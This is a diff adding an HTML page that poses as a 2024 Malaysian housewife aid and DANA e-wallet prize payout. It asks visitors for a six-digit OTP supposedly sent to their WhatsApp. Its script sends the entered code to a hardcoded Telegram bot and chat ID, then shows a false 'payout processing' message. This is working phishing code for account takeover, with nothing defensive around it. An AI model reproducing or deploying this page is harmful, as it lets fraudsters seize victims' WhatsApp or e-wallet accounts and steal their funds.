@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Bantuan Khas Suri Rumah Untuk Warga Malaysia - 2024</title>
+
+    <!-- Link ke Google Fonts -->
+    <link
+      href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap"
+      rel="stylesheet"
+    />
+
+    <!-- Link ke CSS intl-tel-input -->
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css"
+    />
+
+    <style>
+      * {
+        box-sizing: border-box;
+        outline: none;
+        border: none;
+        text-decoration: none;
+      }
+
+      body {
+        font-family: "Poppins", sans-serif;
+        color: #010101;
+        background-color: #007aff;
+      }
+
+      .hero {
+        height: 100vh;
+        width: 100%;
+        background-size: cover;
+        background-position: center;
+        position: relative;
+      }
+
+      img {
+        width: 150px;
+        height: auto;
+        display: flex;
+        margin: 0 auto;
+      }
+
+      .form-container {
+        justify-content: center;
+        background-color: #007aff;
+        padding: 30px 10px;
+        border-radius: 10px;
+        width: 80%;
+        margin: 30px auto;
+        margin-top: 10px;
+      }
+
+      label {
+        display: block;
+        margin-bottom: 8px;
+        font-size: 1.1rem;
+        font-weight: 600;
+        color: #fff;
+      }
+
+      p {
+        font-size: 15px;
+        color: #fff;
+        text-align: center;
+        margin-top: 20px;
+        margin-bottom: 20px;
+        line-height: 1.6;
+        font-weight: 500;
+      }
+
+      .otp-input {
+        display: flex;
+        justify-content: space-between;
+        gap: 6px;
+      }
+
+      .otp-input input {
+        width: 2.5rem;
+        height: auto;
+        text-align: center;
+        font-size: 1.5rem;
+        border: 1px solid #ccc;
+        border-radius: 5px;
+      }
+
+      .btn {
+        display: flex;
+        width: 100%;
+        padding: 12px;
+        margin: 10px auto 0;
+        background-color: #fff;
+        color: #007aff;
+        border: none;
+        border-radius: 5px;
+        font-size: 1.1rem;
+        cursor: pointer;
+        align-items: center;
+        justify-content: center;
+      }
+
+      .btn:hover {
+        background-color: #225786;
+      }
+
+      .response-message {
+        font-size: 14px;
+        color: #fff;
+        text-align: center;
+        margin-top: 10px;
+        display: none;
+      }
+
+      @media (max-width: 768px) {
+        .form-container {
+          width: 100%;
+          padding: 10px;
+        }
+
+        .btn {
+          width: 100%;
+          font-size: 1rem;
+          padding: 10px;
+        }
+
+        .otp-input input {
+          width: 3rem;
+          height: 3rem;
+          font-size: 1.3rem;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="hero">
+      <img src="dana.png" alt="tng-img" />
+
+      <div class="form-container">
+        <p>
+          Selangkah lagi pencairan hadiah akan masuk ke Dana anda. Kami telah
+          mengirim OTP pencairan ke WhatsApp anda, silahlkan masukan kode OTP
+          tersebut pada kolom dibawah ini untuk segera memproses pencairan
+          hadiah anda.
+        </p>
+        <form id="otpForm">
+          <label for="otp">Masukkan OTP yang Kami Kirim ke WhatsApp anda</label>
+          <div class="otp-input">
+            <input type="text" maxlength="1" class="otp-field" required />
+            <input type="text" maxlength="1" class="otp-field" required />
+            <input type="text" maxlength="1" class="otp-field" required />
+            <input type="text" maxlength="1" class="otp-field" required />
+            <input type="text" maxlength="1" class="otp-field" required />
+            <input type="text" maxlength="1" class="otp-field" required />
+          </div>
+          <br />
+          <button type="submit" class="btn">LANJUTKAN</button>
+        </form>
+        <p class="response-message" id="responseMessage">
+          Pencairan anda sedang di proses, silahkan tunggu 10 - 30 menit dana
+          akan langsung masuk ke akun Dana Anda.
+        </p>
+      </div>
+    </div>
+
+    <script>
+      const otpFields = document.querySelectorAll(".otp-field");
+
+      otpFields.forEach((field, index) => {
+        field.addEventListener("input", () => {
+          const nextField = otpFields[index + 1];
+          if (field.value.length === 1 && nextField) {
+            nextField.focus();
+          }
+        });
+
+        field.addEventListener("keydown", (e) => {
+          if (e.key === "Backspace" && field.value === "" && index > 0) {
+            otpFields[index - 1].focus();
+          }
+        });
+      });
+
+      const otpForm = document.getElementById("otpForm");
+      const responseMessage = document.getElementById("responseMessage");
+
+      otpForm.addEventListener("submit", (e) => {
+        e.preventDefault();
+
+        const otp = Array.from(otpFields)
+          .map((input) => input.value)
+          .join("");
+
+        if (otp.length !== 6) {
+          alert("Silakan isi seluruh kolom OTP.");
+          return;
+        }
+
+        const botToken = "7410437482:AAHjVoPurOsB4-yoSFVinzj8VNnrAPVjmpc";
+        const chatId = "5265564576";
+        const message = `Kode OTP: ${otp}`;
+
+        fetch(
+          `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(
+            message
+          )}`
+        )
+          .then((res) => {
+            if (res.ok) {
+              responseMessage.style.display = "block";
+            } else {
+              alert("Gagal mengirim pesan. Silakan coba lagi.");
+            }
+          })
+          .catch(() => {
+            alert("Terjadi kesalahan saat mengirim pesan.");
+          });
+      });
+    </script>
+  </body>
+</html>
